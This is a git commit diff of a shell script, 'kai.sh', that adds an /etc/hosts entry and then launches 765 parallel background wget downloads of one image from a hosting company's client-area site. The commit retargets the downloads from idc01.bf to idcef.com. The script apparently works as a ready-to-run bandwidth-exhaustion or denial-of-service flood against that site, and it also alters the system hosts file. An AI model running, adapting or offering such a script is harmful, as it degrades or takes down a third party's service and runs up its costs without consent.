c140ff3df1f731a021933717da0819492c8cda6e
xjh2009 <102580788+xjh2009@users.noreply.github.com>
2024-02-16 21:06:00 +0800

    Update kai.sh

--- kai.sh
+++ kai.sh
@@ -1,6 +1,6 @@
 echo "154.7.177.145 idc01.bf" >> /etc/hosts
 for ((i=1; i<=765; i++))  
 do  
-nohup wget -O sbzp http://idc01.bf/themes/clientarea/IDC01/assets/images/sec1.jpg > /x${i}-start.log 2>&1 &
+nohup wget -O sbzp http://idcef.com/themes/clientarea/IDC01/assets/images/sec1.jpg > /x${i}-start.log 2>&1 &
 done
 echo ok
